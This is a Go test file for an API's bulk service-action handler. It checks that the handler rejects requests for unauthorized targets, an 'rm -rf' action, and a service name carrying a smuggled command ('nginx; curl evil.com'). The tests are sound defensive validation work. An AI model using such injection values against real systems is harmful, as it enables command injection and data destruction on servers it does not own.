package main

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

func TestHandleV2BulkServiceAction_AllTargetsDenied(t *testing.T) {
	s := newTestAPIServer(t)
	body := `{"action":"restart","service":"nginx","targets":["srv1","srv2"]}`
	req := httptest.NewRequest("POST", "/api/v2/bulk/service-action", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	ctx := contextWithPrincipal(req.Context(), "apikey:k1", "operator")
	ctx = contextWithScopes(ctx, []string{"bulk:*"})
	ctx = contextWithAllowedAssets(ctx, []string{"other-server"}) // srv1,srv2 not allowed
	req = req.WithContext(ctx)
	rec := httptest.NewRecorder()
	s.handleV2BulkServiceAction(rec, req)
	if rec.Code != http.StatusForbidden {
		t.Fatalf("expected 403, got %d: %s", rec.Code, rec.Body.String())
	}
}

func TestHandleV2BulkServiceAction_InvalidAction(t *testing.T) {
	s := newTestAPIServer(t)
	body := `{"action":"rm -rf","service":"nginx","targets":["srv1"]}`
	req := httptest.NewRequest("POST", "/api/v2/bulk/service-action", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	ctx := contextWithPrincipal(req.Context(), "admin", "admin")
	req = req.WithContext(ctx)
	rec := httptest.NewRecorder()
	s.handleV2BulkServiceAction(rec, req)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("expected 400 for invalid action, got %d: %s", rec.Code, rec.Body.String())
	}
}

func TestHandleV2BulkServiceAction_InvalidServiceName(t *testing.T) {
	s := newTestAPIServer(t)
	body := `{"action":"restart","service":"nginx; curl evil.com","targets":["srv1"]}`
	req := httptest.NewRequest("POST", "/api/v2/bulk/service-action", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	ctx := contextWithPrincipal(req.Context(), "admin", "admin")
	req = req.WithContext(ctx)
	rec := httptest.NewRecorder()
	s.handleV2BulkServiceAction(rec, req)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("expected 400 for injection attempt, got %d: %s", rec.Code, rec.Body.String())
	}
}
